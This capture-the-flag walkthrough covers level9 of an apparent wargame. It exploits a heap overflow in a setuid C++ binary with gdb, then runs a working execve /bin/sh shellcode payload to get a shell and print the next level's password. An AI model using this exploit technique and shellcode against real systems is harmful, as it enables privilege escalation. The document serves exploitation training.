
# level9 walkthrough

There is a setuid binary, after analyzing it with gdb we can find 5 interesting functions:

    N::N(int)
    N::setAnnotation(char*)
    N::operator+(N&)
    N::operator-(N&)
    main

This binary is written in cpp and there is no calls to /bin/sh, we can assume we'll have to use shellcode this time.
We can use the memcpy() on argv[1] in setAnnotation() to execute our shellcode.
First of all we need to find the offset:

    (gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
    Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    (gdb) info register eax
    eax            0x41366441       1094083649

We can use pattern generator to find eax offset (108 bytes).
Now we need to construct shellcode which we can get from level2 with few modifications.
In order to do that we need to find the start address of our buffer and replace the value of esp+0x10 with obtained address.
But we also need to dereference twice like we want to access to the N class, our return address should point to the address of our buffer:

    (gdb) b *main+136
    Breakpoint 1 at 0x804867c
    (gdb) run 'aaaa'
    Starting program: /home/user/level9/level9 'aaaa'

    Breakpoint 1, 0x0804867c in main ()
    (gdb) x $eax
    0x804a00c:      0x41414141

The value of [esp+0x10] will be replaced with 0x804a00c.
Because we need to dereference again this address shoul point to the beginning of our shellcode: 0x804a00x + 4 = 0x804a010.

    payload : shell_addr + shellcode + padding + buffer_addr
            [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4

Our final exploit will look like this:

    python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
    level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
    $ whoami
    bonus0
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

